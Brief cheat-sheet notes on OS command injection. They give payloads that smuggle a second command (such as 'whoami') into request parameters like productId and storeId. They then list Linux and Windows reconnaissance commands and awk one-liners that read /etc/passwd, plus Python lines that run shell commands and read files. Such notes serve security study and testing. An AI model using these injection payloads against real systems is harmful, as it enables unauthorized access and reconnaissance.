# OS Command Injection
also known as "shell injection"


Placing the additional command separator & after the injected command is useful because it separates the injected command from whatever follows the injection point. This reduces the chance that what follows will prevent the injected command from executing.

Example:
`productId=8&storeId=1|whoami`
`productId=8 & whoami & storeId=1`
`productId=8 & whoami # (this is a comment) storeId=1`

# Linux
whoami
id
uname -a
ifconfig/ip addr
netstat -an
ps -ef


How many non-root/non-service/non-daemon users are there?
`awk -F':' '{ if ($3 >= 1000 && $1 != "nobody" ) print $1 }' /etc/passwd | wc -l`

What is the [USER]'s shell set as?
`getent passwd [USER]| awk -F':' '{print $7}'`
	- eg: `getent passwd www-data | awk -F':' '{print $7}'`



#Windows
whoami
ver
ipconfig /all
netstat -an
tasklist




# Python
import os; print(os.popen("ls -l").read())
import os; print(open("path/to/your/file.txt", "r").read())